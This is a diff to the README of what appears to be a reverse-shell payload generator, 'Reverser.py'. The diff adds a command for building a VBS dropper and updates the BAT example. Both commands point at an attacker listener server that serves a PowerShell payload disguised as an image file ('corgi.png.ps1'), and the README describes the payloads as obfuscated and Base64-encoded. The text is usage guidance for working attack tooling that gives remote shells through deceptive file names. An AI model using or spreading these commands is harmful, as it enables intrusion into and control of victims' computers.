@@ -44,10 +44,13 @@ Creating only a PS1 file (obfuscated and Based64 encoded):
 ```bash
 python3 Reverser.py -ip <Your_IP> -port <Your_PORT> -type ps1
 ```
-
+Creating a VBS file with the tool and transferring it to the listener's directory:
+```bash
+python3 Reverser.py -ip <Your_IP> -port <Your_PORT> -type vbs -server https://<Your_Listener_Server_IP_For_Downloadin_PS1/download/photo/corgi.png.ps1>
+```
 Creating a BAT file with the tool and transferring it to the listener's directory:
 ```bash
-python3 Reverser.py -ip <Your_IP> -port <Your_PORT> -type bat -server https://<Your_Listener_Server_IP_For_Downloadin_PS1/welcome.pdf.ine.co.il.ps1>
+python3 Reverser.py -ip <Your_IP> -port <Your_PORT> -type bat -server https://<Your_Listener_Server_IP_For_Downloadin_PS1/download/photo/corgi.png.ps1>
 ```
 ![image](https://github.com/user-attachments/assets/350a0105-c8a3-43f5-8e67-fddb34cf84f8)
 
